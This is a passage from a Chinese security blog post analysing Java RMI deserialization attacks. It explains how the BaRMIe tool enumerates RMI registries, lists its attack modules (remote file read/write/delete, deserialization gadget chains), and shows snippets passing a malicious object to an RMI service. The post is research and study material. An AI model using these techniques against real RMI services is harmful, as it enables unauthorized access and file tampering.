<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="字数：1w6 推荐阅读时间：&amp;gt;2h 前言其实起因听老哥讲“shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来”，啊！JRMP，RMI学过，我会的我会的…….实际上我会个锤子，YSO-JRMP的模块根本没用过。  但实际上本文只是顺道解决了这个问题，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPLis">
<meta name="keywords" content="java,rmi">
<meta property="og:type" content="article">
<meta property="og:title" content="RMI-反序列化-深入-上">
<meta property="og:url" content="http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/index.html">
<meta property="og:site_name" content="啦啦菌NODE">
<meta property="og:description" content="字数：1w6 推荐阅读时间：&amp;gt;2h 前言其实起因听老哥讲“shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来”，啊！JRMP，RMI学过，我会的我会的…….实际上我会个锤子，YSO-JRMP的模块根本没用过。  但实际上本文只是顺道解决了这个问题，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPLis">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16qg4vw0j31h215qdja.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rfprkrj30zq0btmzf.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rqsevuj30x603daan.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rvgizxj30k00e8gm7.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16s5z34uj31hh04pgmn.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sdbtxjj31ic125tdv.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sla9atj31ev0rm77c.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sqaqwrj31uz0h1jxf.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16svigjdj31el12fdl0.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tc3gg4j31g80o1di8.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16thrig4j31j80r7wg7.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tmsyclj31ci0ps405.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tuhpwfj31200gjq42.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tzrpjcj315d0cvq3x.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16u5qw2ej31370jl3zu.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uaiz26j30om0m4jt1.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uk8849j31kx0r2wod.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uop4x4j31ei0ovjzl.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uw9lznj31do0bttav.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v3vulhj30vz044q34.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v85jyoj31720g2djn.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wjm7xfj32210wp15p.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wsgxjjj311d0qpai3.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wx05oxj31qs07agm4.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16x44656j31hr102q9s.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16xsae5tj31bs0kz0u0.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16z6m443j314y0g70ua.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16zoxt9zj324i0hhn10.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17020r99j31a00ojgnn.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170jw0glj31230ddgns.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170wu8s1j31lp0zbjww.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1712vjb7j31p20xrdl8.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171ak79qj30qe0y1aes.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171jcemgj32bc1jkatw.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171s50s1j31s306x3z0.jpg">
<meta property="og:updated_time" content="2020-06-24T03:05:18.834Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RMI-反序列化-深入-上">
<meta name="twitter:description" content="字数：1w6 推荐阅读时间：&amp;gt;2h 前言其实起因听老哥讲“shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来”，啊！JRMP，RMI学过，我会的我会的…….实际上我会个锤子，YSO-JRMP的模块根本没用过。  但实际上本文只是顺道解决了这个问题，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPLis">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>RMI-反序列化-深入-上</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/22/RMI 反序列化-深入-下/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/03/05/JAVA反序列化-ysoserial-URLDNS/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&text=RMI-反序列化-深入-上"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&is_video=false&description=RMI-反序列化-深入-上"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI-反序列化-深入-上&body=Check out this article: http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&name=RMI-反序列化-深入-上&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#回顾稚嫩的过去"><span class="toc-number">2.</span> <span class="toc-text">回顾稚嫩的过去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探测利用开放的RMI服务"><span class="toc-number">3.</span> <span class="toc-text">探测利用开放的RMI服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BaRMIe"><span class="toc-number">3.1.</span> <span class="toc-text">BaRMIe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看看探测利用开放的RMI服务的攻击模块是怎么实现的"><span class="toc-number">3.2.</span> <span class="toc-text">看看探测利用开放的RMI服务的攻击模块是怎么实现的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI客户端反序列化攻击RMI服务端"><span class="toc-number">4.</span> <span class="toc-text">RMI客户端反序列化攻击RMI服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Object类型参数"><span class="toc-number">4.1.</span> <span class="toc-text">利用Object类型参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞触发点"><span class="toc-number">4.1.1.</span> <span class="toc-text">漏洞触发点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过Object类型参数"><span class="toc-number">4.2.</span> <span class="toc-text">绕过Object类型参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI服务端反序列化攻击RMI注册端"><span class="toc-number">5.</span> <span class="toc-text">RMI服务端反序列化攻击RMI注册端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI客户端角度的lookup攻击RMI注册端"><span class="toc-number">5.0.1.</span> <span class="toc-text">RMI客户端角度的lookup攻击RMI注册端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Barmie-Bind"><span class="toc-number">5.1.</span> <span class="toc-text">Barmie - Bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ysoserial-RMIRegistryExploit-Bind"><span class="toc-number">5.2.</span> <span class="toc-text">Ysoserial-RMIRegistryExploit - Bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIattack-Bind-回显"><span class="toc-number">5.3.</span> <span class="toc-text">RMIattack - Bind + 回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JEP290修复"><span class="toc-number">5.4.</span> <span class="toc-text">JEP290修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注册端对于服务端地址校验的变动"><span class="toc-number">5.5.</span> <span class="toc-text">注册端对于服务端地址校验的变动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-DGC层反序列化"><span class="toc-number">6.</span> <span class="toc-text">RMI DGC层反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DGC客户端打DGC服务端"><span class="toc-number">6.1.</span> <span class="toc-text">DGC客户端打DGC服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JEP290修复-1"><span class="toc-number">6.2.</span> <span class="toc-text">JEP290修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"><span class="toc-number">7.</span> <span class="toc-text">为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">8.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RMI-反序列化-深入-上
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">啦啦菌NODE</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-06-22T09:05:33.000Z" itemprop="datePublished">2020-06-22</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/rmi/">rmi</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>字数：1w6</p>
<p>推荐阅读时间：&gt;2h</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实起因听老哥讲<strong>“shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来”</strong>，啊！JRMP，RMI学过，我会的我会的…….实际上我会个锤子，YSO-JRMP的模块根本没用过。</p>
<blockquote>
<p>但实际上本文只是顺道解决了这个问题，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener) 中去解答这个疑问，利用方式是同理的。</p>
</blockquote>
<p>然后有一天看了一波别人攻击RMI服务的工具，瞬间三观崩坏，打脸piapia响！</p>
<p>于是…..花了按照月为单位的很长时间洋洋洒洒写了3w字的文整理了针对RMI服务的9种攻击方式，长文少有人能看下去，先丢上最终的研究的结果吧。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p>
<p>如果觉得有什么出入，喷就完事了；<br>同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃…..</del></p>
<p>咳。同时由于文章实在过长，图片多达74张，将全文分为上、下两篇。</p>
<p>在上篇中将讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，是对已有常见利用方式的总结。</p>
<p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p>
<p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank" rel="noopener">github</a>。</p>
<p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。</p>
<h2 id="回顾稚嫩的过去"><a href="#回顾稚嫩的过去" class="headerlink" title="回顾稚嫩的过去"></a>回顾稚嫩的过去</h2><p>在学习了一整子之后回过头去看之前对于RMI的理解真是片面啊……<br>在 RMI 反序列化一文中，我们把RMI服务的攻击维度分成四个方向：</p>
<ol>
<li>探测利用开放的RMI服务</li>
<li>基于RMI服务反序列化过程的攻击</li>
<li>利用RMI的动态加载特性的攻击利用</li>
<li>结合JNDI注入</li>
</ol>
<blockquote>
<p>我个人推荐把第一、第二方向与第三、第四个方向隔离开讨论与理解，第二个点是标准反序列化利用套路（readobject入口点+利用链+RCE）。同第一个一样都是针对RMI服务进行攻击，即打一个1099端口。</p>
<p>而第三、第四个点则是想办法让对方服务器加载我们的恶意类，在对方服务器上实例化的时候执行恶意的构造函数或静态方法等（JNDI由于代码还可以执行另一个方法，这里不多说了）</p>
<p><strong>我们在本文中只专注讨论剖析 探测利用开放的RMI服务、基于RMI服务反序列化过程的攻击</strong></p>
</blockquote>
<p>我们对于<strong>1.探测利用开放的RMI服务</strong>简单纸上谈兵了一下：可能存在可以利用的随便写入文件的类啦巴拉巴拉。</p>
<p>同时简单复现了其中的<strong>2.基于RMI服务反序列化过程</strong>的攻击：</p>
<p>在起一个有CC利用链（Commons-Collections）的RMI服务端之后，我们将服务端提供的服务的接口参数设置成Object类型（因为我们的payload就是Object对象）然后再拿这个object的payload去打提供服务的RMI服务端，成功。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">User userClient = (User)Naming.lookup(url);</span><br><span class="line">userClient.say(<span class="string">"world"</span>);</span><br><span class="line">userClient.dowork(getpayload());</span><br><span class="line"><span class="comment">//dowaok接受一个Object函数，这时候我们传入恶意object会在对方服务器readobject反序列化</span></span><br></pre></td></tr></table></figure>
<p>于是那时候总结就是，如果RMI服务端可以被攻击成功需要：</p>
<ol>
<li>服务端提供一个RMI服务，提供的RMI服务的方法的参数必须为Object（因为我们的payload是Object）</li>
<li>服务端有可以被利用的反序列化利用链及环境</li>
</ol>
<p>于是就觉得辣鸡漏洞，还需要对方提供一个Object的对象来把自己的payload对着这个Object点塞进去才行。实际情况咋可能，垃圾。</p>
<p>实际上，对于之前讨论的：</p>
<ol>
<li>我们没有对探测利用开放的RMI服务进行进一步探究，到底是怎么探测的？</li>
<li>RMI客户端打RMI服务端我们知道需要一个Object接口，但是我们是可以查询到这个接口是不是有Object参数，然后真的就条件这么苛刻，没有其他办法了么？</li>
<li>之前的分析，完全忽略了<strong>RMI注册端</strong>的情况。</li>
<li>之前的分析，完全片面理解了针对RMI服务的攻击，实际上还有很多利用方式和细节，简直管中窥豹。</li>
<li>我们没有继续分析相应的利用工具的使用以及实现细节。</li>
<li>我们没有继续分析在JDK版本更新中对于封堵的绕过情况</li>
</ol>
<p>这是一长串的一环套着一环的疑问，</p>
<p>我们先来解决第一个问题 <strong>探测利用开放的RMI服务到底是个怎样攻击的流程</strong>。</p>
<h2 id="探测利用开放的RMI服务"><a href="#探测利用开放的RMI服务" class="headerlink" title="探测利用开放的RMI服务"></a>探测利用开放的RMI服务</h2><p>之前我们讲到探测利用开放的RMI服务，使用工具<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>去寻找可受攻击的RMI服务，比如可能提供了文件上传等危险功能，一种就跟普通web测试差不多的很简单的感觉。</p>
<p>但实际上我们要调用一个存在危险功能的RMI服务端需要知道：RMI对象<strong>a</strong>、方法<strong>b</strong>、参数<strong>c</strong>，即<code>a.b(c)</code></p>
<p>自然会认为我们作为RMI客户端向RMI注册端查询有哪些RMI服务端，然后再去RMI服务端查询接口和参数，再根据返回的接口和参数，构造利用就好了。</p>
<p>但是回忆一下在上一篇中讲述的RMI通讯流程，好像压根就没有RMI客户端向RMI服务端查询接口（方法和参数）的这一步骤，都是本地写一个一模一样的接口然后直接调用的。</p>
<p>那么我们得不到方法和参数，实际上是不是根本就没有探测利用开放的RMI服务利用这么一说呢？</p>
<p>我们来看<strong>BaRMIe工具</strong>是怎么做的。</p>
<h3 id="BaRMIe"><a href="#BaRMIe" class="headerlink" title="BaRMIe"></a>BaRMIe</h3><p>先分析下这个工具——<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>。工具提供了两种利用模式——<code>enum</code>枚举模式，<code>attack</code>攻击模式。</p>
<p>Github下载源码，然后Debug一下这个工具，idea使用<strong>listen to remote JVM</strong>的形式进行调试。</p>
<p>idea端：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16qg4vw0j31h215qdja.jpg" alt="barmie调试.png"></p>
<p>源码处下断点，复制图中那个Command line，然后删掉&lt;&gt;可选，命令行运行比如：</p>
<p><code>java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y -jar BaRMIe.jar -enum 127.0.0.1 1099</code></p>
<p>就可以调试了。（复制过去是不行的因为address不一样）</p>
<p>看enum枚举模式。入口在<code>nb.barmie.modes.enumeration.EnumerationTask#run</code></p>
<p>代码不复杂就不大篇幅注解了，主要分为几步，直接总结下：</p>
<p><strong>第一步</strong>：<code>ep = this._enumerator.enumerateEndpoint(this._target);</code></p>
<p>作为RMI客户端向RMI注册端获取RMI服务端信息，这里叫做Endpoint，并分析Endpoint是RMI服务端</p>
<ol>
<li><code>LocateRegistry.getRegistry</code>获取目标IP端口的RMI注册端</li>
<li><code>reg.list()</code>获取注册端上所有服务端的Endpoint对象</li>
<li>使用<code>reg.unbind(unbindName);</code>解绑一个不存在的RMI服务名，根据报错信息来判断我们当前IP是否可以操控该RMI注册端（如果可以操控，意味着我们可以解绑任意已经存在RMI服务，但是这只是破坏，没有太大的意义，就算bind一个恶意的服务上去，调用它，也是在我们自己的机器上运行而不是RMI服务端）</li>
<li>本地起一个代理用的RMI注册端，用于转发我们对于目标RMI注册端的请求（在RaRMIe中，通过这层代理用注册端可以变量成payload啥的，算是一层封装；在这里用于接受原始回应数据，再进行解析）</li>
<li>通过代理服务器<code>reg.lookup(objectNames[i]);</code>遍历之前获取的所有服务端的Endpoint。</li>
<li>通过代理服务器得到lookup返回的源数据，自行解析获取对应对象相应的类细节。（因为直接让他自动解析是不会有响应的类信息的）</li>
</ol>
<p>至此就获取了如下信息，可以看到会解析出RMI服务端的类名等等。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rfprkrj30zq0btmzf.jpg" alt="barmie-part1.png"></p>
<p>如果这些信息都获取成功，就会判定为这个端口是一个注册端，否则觉得这个不是注册端，输出</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rqsevuj30x603daan.jpg" alt="barmie-part2.png"></p>
<p>但是实际上你一个根本没开的端口扫描结果也会跟你说是一个RMI服务接口，随便看看就好了，相当于失败了。</p>
<p><strong>第二步</strong>：<code>attacks = RMIAttackFactory.findAttacksForEndpoint(ep);</code>：</p>
<p>对于所有Endpoint（RMI服务端）进行遍历，再一一调用攻击模块判断是否可以攻击。</p>
<p>攻击模块如下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rvgizxj30k00e8gm7.jpg" alt="attack模块.png"></p>
<p>在看完代码后，我把他们根据攻击类型划分如下：</p>
<ol>
<li>RMI客户端探测利用RMI服务：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Axiom</span><br><span class="line">	-DeleteFile</span><br><span class="line">	-ListFiles</span><br><span class="line">	-ReadFile</span><br><span class="line">	-WriteFile</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>RMI客户端反序列化攻击RMI服务端——利用Object类型参数（RMI服务端提供的对象的方法参数有一个是Obejct类型）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">	-JmxDeser</span><br><span class="line">SpringFramework</span><br><span class="line">	-RmiInvocationHandlerDeser</span><br><span class="line">	-Spring2RmilnvocationHandlerDeser</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>RMI服务端攻击RMI注册端——Bind类攻击</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">	-IllegalRegistryBind</span><br></pre></td></tr></table></figure>
<p>以上当然这就有超出了探测利用RMI服务以外的类型，我们先划分出来。看看调用攻击模块之后做了什么，再回过头一个个分析攻击模块。</p>
<p><strong>第三步</strong>：<code>deserPayloads = DeserPayloadFactory.findGadgetsForEndpoint(ep);</code></p>
<p>对于所有Endpoint（RMI服务端）进行遍历，尝试判断是否存在反序列化利用链。</p>
<ol>
<li>其判断的原理大概是，判断RMI注册端提供的RMI服务端的对象class（如：com.lala.User）的路径中（不是非常确定？)，是否包含存在已知反序列化利用链的jar包。</li>
</ol>
<p>这是一个比较不靠谱的判断是否存在反序列化利用链的方法，反正我靶机中服务端有CC利用链，但是无法探测到。</p>
<p>其中工具中已知反序列化利用链的jar包类别如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollectionsPayload</span><br><span class="line">GroovyPayload</span><br><span class="line">JBossInterceptorsPayload</span><br><span class="line">ROMEPayload</span><br><span class="line">RhinoPayload</span><br></pre></td></tr></table></figure>
<h3 id="看看探测利用开放的RMI服务的攻击模块是怎么实现的"><a href="#看看探测利用开放的RMI服务的攻击模块是怎么实现的" class="headerlink" title="看看探测利用开放的RMI服务的攻击模块是怎么实现的"></a>看看探测利用开放的RMI服务的攻击模块是怎么实现的</h3><p>4个攻击模块Delete、List、Read、Write都是针对AxiomSL这个组件。看一个List的。</p>
<p>描述：AxiomSL公开一个对象FileBrowserStub，它有一个list files（）方法，该方法返回给定目录中的文件列表。</p>
<p>在判断是否存在漏洞时会去判断RMI服务返回的对象的class栈中是否存在以下class路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axiomsl.server.rmi.FileBrowserStub</span><br></pre></td></tr></table></figure>
<p>判断存在该class路径后，再进行利用；实际利用代码也很简单，就是普通的RMI服务调用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nb.barmie.modes.attack.attacks.Axiom.ListFiles#executeAttack</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">		<span class="comment">//一些参数设定	</span></span><br><span class="line">    </span><br><span class="line">		<span class="comment">//用户输入一个想要列出的文件目录</span></span><br><span class="line">		path = <span class="keyword">this</span>.promptUserForInput(<span class="string">"Enter a path to list files from: "</span>, <span class="keyword">false</span>);</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//向eq（RMI服务端）lookup一个FileBrowserStub对象</span></span><br><span class="line">    	<span class="comment">//同时本地也写好了FileBrowserStub接口</span></span><br><span class="line">		System.out.println(<span class="string">"[~] Getting fileBrowser object..."</span>);</span><br><span 